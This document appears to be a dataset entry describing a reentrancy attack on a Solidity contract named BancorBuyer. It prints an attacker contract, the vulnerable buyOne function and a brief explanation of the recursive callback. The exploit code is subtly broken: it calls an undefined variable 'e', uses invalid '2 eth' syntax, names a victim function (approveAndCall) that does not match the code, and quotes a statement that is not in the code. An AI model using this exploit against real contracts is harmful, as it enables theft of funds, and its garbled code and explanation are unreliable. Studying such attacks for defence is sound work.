# Attack04

### Contract Name:

BancorBuyer (test2073.sol)

### Contract Address:



### Transaction Count:



### Involved Ethers:



### Length of the Call Chain: 

1 external function

### Victim Function:

`approveAndCall(address,uint256,bytes)`

### Attack Mechanism:

Attack code:

```javascript
contract Attack{
    BancorBuyer b = new BancorBuyer();
    ERC20 er = new ERC20();
    bytes  bs4 = new bytes(4);
    bytes4 functionSignature = bytes4(keccak256("attack()"));
    constructor() payable {}
    function prepareWork() {
        for (uint i = 0; i< bs4.length; i++){
            bs4[i] = functionSignature[i];
        }
    }
    function attack() public {
        e.buyOne.value(2 eth)(er, this, 1 eth, bs4);
    }
    function() payable{
    }
    function getvalue() returns (uint) {
        return this.balance;
    }
}
contract ERC20{

}
```

Attacked code:

```javascript
contract BancorBuyer {
    ...
    function buyOne(
        ERC20 token,
        address _exchange,
        uint256 _value,
        bytes _data
    ) 
        payable
        public
    {
        balances[msg.sender] = balances[msg.sender].add(msg.value);
        uint256 tokenBalance = token.balanceOf(this);
        require(_exchange.call.value(_value)(_data));
        balances[msg.sender] = balances[msg.sender].sub(_value);
        tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token]
            .add(token.balanceOf(this).sub(tokenBalance));
    }
    ...
}
  ...
```
In this case, the goal of our reentrancy is `require(_exchange.call.value(_value)(_data));` in the victim code.  we need to make sure the *_exchange* is equal to `Attack`'s address. it is too easy.Note that the `_data` parameter we passed in our attack function is called signature to ensure that we can recursively call our attack function.

**Attack.** The attacker call `attack()` function, it calls `buyOne` function with the parameters setted by attacker in victim contract.  because `_exchange` is assigned `Attack`'s address. Next finally get to the key statement `require(_spender.call.value(msg.value)(_data));` which calls back to the `attack()` function in attacker's contract. Hence, a call loop is formed and we achieved a *Reentrancy* attack.